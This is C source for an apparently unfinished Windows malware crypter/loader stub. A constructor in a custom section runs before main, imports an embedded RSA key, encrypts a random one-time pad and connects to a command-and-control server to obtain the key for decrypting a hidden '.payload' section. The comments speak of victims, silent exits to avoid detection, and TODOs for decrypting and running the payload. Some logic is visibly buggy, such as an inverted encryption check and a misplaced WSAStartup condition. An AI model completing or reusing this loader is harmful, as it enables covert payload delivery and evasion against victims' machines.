#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "cryptor.h"
#include <wincrypt.h>
#include <ws2tcpip.h>
__attribute__((constructor, section(".cryptor"))) int construct(){

/*
 * Get the section offsets for the cryptor to decrypt the payload stub
 */
    extern UINT64 START_OF_PAYLOAD;
    extern UINT64 END_OF_PAYLOAD;
    UINT64  addr_S = (UINT64)&START_OF_PAYLOAD;
    UINT64  addr_e = (UINT64)&END_OF_PAYLOAD;
/*
 * Define vars necessary to decode the IV
 */
    BYTE* iv = IV;
    BYTE* decodedIV = malloc(IVLEN+1);
    memset(decodedIV,0,IVLEN+1);
    DWORD sz = IVLEN;
/*
 * define variables necessary to decode the public key
 */
    BYTE* PemPubKey = PUBKEY; //Public key embedded in header
    BYTE derPubKey[RSAKEYLEN] = {0};
    DWORD derPubKeylen = RSAKEYLEN;
    CERT_PUBLIC_KEY_INFO *PubKeyInfo;
    DWORD PubKeyInfoLen;
    HCRYPTPROV hProvRSA = 0;
    HCRYPTKEY hKeyRSA = 0;
/*
 * Define Variables required to generate a cryptographically random integer
 */
    BYTE* OTP = malloc(AESKEYLEN+1);
    memset(OTP,0,AESKEYLEN+1);
    HCRYPTPROV hProvRRand = 0;
    DWORD RsaCryptLen = AESKEYLEN+1;
/*
 * Definitions of variables for the windows client
 */
    WSADATA  wsaData;
    struct addrinfo *result = NULL, init = {0};
    SOCKET Connection;
/*
 * retrieving the public key
 * in the event of an error silently exit 0. No reason to provide a return status to a victim
 */
    if(!CryptStringToBinaryA(PemPubKey, 0, CRYPT_STRING_BASE64HEADER, derPubKey,&derPubKeylen,NULL, NULL))
        exit(0);
    if(!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, derPubKey,derPubKeylen,
                            CRYPT_ENCODE_ALLOC_FLAG,NULL,&PubKeyInfo,&PubKeyInfoLen))
        exit(0);
    if(!CryptAcquireContext(&hProvRSA,NULL,NULL,PROV_RSA_FULL,CRYPT_VERIFYCONTEXT))
        exit(0);
    if(!CryptImportPublicKeyInfo(hProvRSA,X509_ASN_ENCODING,PubKeyInfo, &hKeyRSA))
        exit(0);
    LocalFree(PubKeyInfo);
/*
 * Generate a one time pad generation
 * Generate 32 random bytes. These bytes are sent to the server encrypted with RSA 4096
 * The bytes will be XORed against the AES key used to decrypt the .payload section.
 */

    if(!CryptAcquireContext(&hProvRRand,0,0,PROV_RSA_FULL,CRYPT_VERIFYCONTEXT))
        exit(0);
    if(!CryptGenRandom(hProvRRand,AESKEYLEN,OTP))
        exit(0);
/*
 * Encrypt the one time pad with the RSA key
 */
    if(CryptEncrypt(hKeyRSA,0,TRUE,0,OTP,&RsaCryptLen,AESKEYLEN+1))
        exit(0);
/*
 *  Configure socket descriptor and set the socket IP address
 */
    if (WSAStartup(0x0202,&wsaData))

    init.ai_family = AF_INET; // IPV4 address
    init.ai_socktype = SOCK_STREAM; //define a reliable connection
    init.ai_protocol = IPPROTO_TCP; // tcp because it's stable

    if(getaddrinfo(IPADDR_SVR,PORT_SVR,&init,&result) == INVALID_SOCKET)
        exit(-1);

    if((Connection = socket(result->ai_family, result->ai_socktype, result->ai_protocol))==INVALID_SOCKET)
    {
        freeaddrinfo(result);
        WSACleanup();
        exit(0);
    }
    if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
    {
        printf("here");
        exit(-1);
    }
/*
 * Attempt to connect to the C2 server to retrieve the keys necessary to decrypt
 * the payolad section, for this to work this client transmits a OTP that has been
 * encrypted using an RSA public key (Length defined by the Conf file, default 4096)
 */
/** TODO
 * CONNECT TO SERVER
 * SEND ENCRYPTED OTP
 * RECIVE PAYLOAD ENCRYPTION KEY
 * USE OTP TO RETRIVE AES KEY
 */
/*
 * Decode The IV
 */
    if (!CryptStringToBinaryA(iv,IVENCLEN,CRYPT_STRING_BASE64, decodedIV,&sz,NULL,NULL))
        exit(0); /*
                  * silently exit, even though we exit with error we don't
                  * give this information to the OS
                  */
/** TODO
 *  DECRYPT PAYLOAD
 *  RUN PAYLOAD
 */
return 0;
}

__attribute__((section(".payload"))) void payolad(){

printf("here");

}

int main()
{
return 0;//payolad();
}
